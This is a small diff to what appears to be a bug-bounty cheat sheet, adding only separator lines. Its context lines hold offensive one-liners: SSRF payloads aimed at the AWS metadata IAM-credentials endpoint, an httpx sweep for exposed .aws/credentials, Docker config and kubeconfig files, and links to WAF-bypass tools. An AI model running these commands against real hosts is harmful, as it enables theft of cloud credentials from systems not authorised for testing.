@@ -1638,6 +1638,7 @@ cat urls.txt | gf ssrf | qsreplace "http://169.254.169.254/latest/meta-data/iam/
 cat alive.txt | httpx -silent -path /.aws/credentials,/.docker/config.json,/kubeconfig -mc 200 | anew cloud_creds.txt
 ```
 
+---
 
 ## Waf Evasion
 - Advanced tool for security researchers to bypass 403/40X restrictions :
@@ -1655,6 +1656,7 @@ go install github.com/devploit/nomore403@latest
 https://github.com/assetnote/nowafpls
 ```
 
+---
 
 ## 🤖 Automation Scripts
 
